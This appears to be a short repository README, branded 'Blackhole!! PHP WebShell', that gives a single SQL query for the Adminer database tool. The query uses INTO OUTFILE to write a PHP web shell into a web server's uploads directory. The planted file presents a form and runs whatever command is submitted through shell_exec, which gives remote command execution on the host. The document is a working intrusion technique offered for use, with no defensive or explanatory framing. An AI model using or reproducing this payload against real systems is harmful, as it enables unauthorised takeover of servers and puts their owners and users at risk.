# adminer-load-shell


</h1>
<h4 align="center">Blackhole!! PHP WebShell</h4>

<p align="center">
    <img src="https://img.shields.io/badge/release-Prv8-blue.svg">
    <img src="https://img.shields.io/badge/issues-0-red.svg">
    <img src="https://img.shields.io/badge/php-7-green.svg">
    <img src="https://img.shields.io/badge/php-5-green.svg">
</p>

1. SQL command `Query SQL` value
```
SELECT '<?php
if (isset($_POST["submit"])) {
    $cmd = $_POST["cmd"];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>

<form action="" method="post">
    <input type="text" name="cmd" placeholder="Enter command" size="50" required>
    <input type="submit" name="submit" value="Execute">
</form>' INTO OUTFILE '/var/www/html/web/uploads/cmd.php'
FIELDS TERMINATED BY '' LINES TERMINATED BY '';
```
